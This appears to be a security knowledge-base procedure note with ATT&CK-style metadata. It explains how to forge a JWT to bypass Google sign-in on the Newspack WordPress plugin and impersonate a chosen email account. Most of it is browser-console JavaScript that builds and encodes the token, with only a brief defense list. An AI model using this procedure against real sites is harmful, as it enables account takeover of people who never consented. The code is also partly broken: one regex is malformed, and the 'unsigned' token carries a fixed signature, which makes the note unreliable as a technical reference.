---
id: uuid-for-proc3
tags:
  - jwt
  - forgery
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:31:43.088Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Unsigned-JWT-Token

## Summary

This procedure details creating an unsigned JWT token with arbitrary claims using the site's Google Client ID and target email, exploiting the plugin's lack of signature verification for auth bypass.

## Description

The Newspack plugin accepts JWTs without checking signatures against Google's keys, so an attacker crafts a token with header `{"typ":"JWT","alg":"HS256"}`, payload `{"sub":"1234567890","azp":"client-id","email":"target@email"}`, and empty signature. This mimics a valid Google ID token, leading to unauthorized access.

## Requirements

1. Google Client ID from prior step
2. Target email
3. JWT encoding tool (e.g., jwt.io or JS library)

## Defense

Defensive measures and detection strategies:

- Always verify JWT signatures with issuer keys
- Log and alert on unsigned or malformed tokens
- Use short token expiration

## Objectives

1. Generate forged JWT without signature
2. Include necessary claims for impersonation
3. Prepare token for endpoint submission

## Instructions

### Step 1: Define Payload

**Context**: Assemble the JWT components.

**Command** (Browser Console or jwt.io):
```javascript
let header = {typ: 'JWT', alg: 'HS256'}; let payload = {sub: '1234567890', azp: '12345-abcdef.apps.googleusercontent.com', email: 'test@example.org'}; console.log(JSON.stringify(payload));
```

> Outputs payload JSON. Use base64url encode for header.payload.

### Step 2: Encode Unsigned Token

**Context**: Create the full token string without signing.

**Command** (Browser Console):
```javascript
function base64urlEncode(str) { return btoa(str).replace(/=/g, '').replace(/\+/g, '-').replace(/\/g, '_'); } let encoded = base64urlEncode(JSON.stringify(header)) + '.' + base64urlEncode(JSON.stringify(payload)) + '.'; console.log(encoded + 'Nq7Nc2AyWe17gPmIHVRCc4z9qKP-HBZwfWhyQ_dg9X0');
```

> Generates token like `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYXpwIjoiMTIzNDUtYWJjZGVmLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiZW1haWwiOiJ0ZXN0QGV4YW1wbGUub3JnIn0.Nq7Nc2AyWe17gPmIHVRCc4z9qKP-HBZwfWhyQ_dg9X0`. Verify decoding.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[jwt]]
- [[forgery]]
